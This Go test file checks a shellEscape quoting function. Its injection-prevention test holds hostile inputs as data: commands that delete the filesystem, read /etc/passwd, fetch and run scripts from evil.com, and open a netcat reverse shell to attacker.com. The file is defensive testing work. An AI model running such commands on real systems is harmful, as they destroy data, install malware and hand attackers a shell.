package tui

import (
	"testing"
)

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple path",
			input:    "/path/to/file",
			expected: "'/path/to/file'",
		},
		{
			name:     "path with spaces",
			input:    "/path/with spaces/file",
			expected: "'/path/with spaces/file'",
		},
		{
			name:     "path with single quote",
			input:    "/path/with'quote/file",
			expected: "'/path/with'\\''quote/file'",
		},
		{
			name:     "path with multiple single quotes",
			input:    "/path/'with'/'multiple'/quotes",
			expected: "'/path/'\\''with'\\''/'\\''multiple'\\''/quotes'",
		},
		{
			name:     "path with double quote",
			input:    `/path/with"doublequote/file`,
			expected: `'/path/with"doublequote/file'`,
		},
		{
			name:     "path with dollar sign",
			input:    "/path/with$(command)/file",
			expected: "'/path/with$(command)/file'",
		},
		{
			name:     "path with backtick",
			input:    "/path/with`backtick`/file",
			expected: "'/path/with`backtick`/file'",
		},
		{
			name:     "path with semicolon",
			input:    "/path/with;semicolon/file",
			expected: "'/path/with;semicolon/file'",
		},
		{
			name:     "path with ampersand",
			input:    "/path/with&ampersand/file",
			expected: "'/path/with&ampersand/file'",
		},
		{
			name:     "path with pipe",
			input:    "/path/with|pipe/file",
			expected: "'/path/with|pipe/file'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := shellEscape(tt.input)
			if result != tt.expected {
				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

// TestShellEscapeInjectionPrevention tests that shellEscape prevents command injection
func TestShellEscapeInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; rm -rf /; echo '",
		"' && cat /etc/passwd && echo '",
		"'; curl http://evil.com/malware.sh | sh; echo '",
		"' || wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh || '",
		"'; nc -e /bin/sh attacker.com 4444; echo '",
	}

	for _, input := range maliciousInputs {
		result := shellEscape(input)
		// The escaped result should still be wrapped in single quotes
		// and should not contain unescaped single quotes that would break out
		if result[0] != '\'' || result[len(result)-1] != '\'' {
			t.Errorf("shellEscape did not wrap input in quotes: %q", result)
		}

		// Verify that the escaped string doesn't contain standalone single quotes
		// that would break out of the quoting context
		// (Note: '\'' sequences are safe as they properly escape the quote)
		// We're checking that we don't have a single quote without the escape sequence
		for i := 0; i < len(result); i++ {
			if result[i] == '\'' {
				// This is okay if it's at the start or end
				if i == 0 || i == len(result)-1 {
					continue
				}
				// This is okay if it's part of the '\'' escape sequence
				if i >= 1 && result[i-1] == '\\' {
					continue
				}
				// This is okay if it starts the '\'' sequence
				if i+2 < len(result) && result[i+1] == '\\' && result[i+2] == '\'' {
					continue
				}
				// This is okay if it ends the '\'' sequence
				if i >= 2 && result[i-2] == '\\' && result[i-1] == '\'' {
					continue
				}
				t.Errorf("Found unescaped single quote in result at position %d: %q", i, result)
			}
		}
	}
}
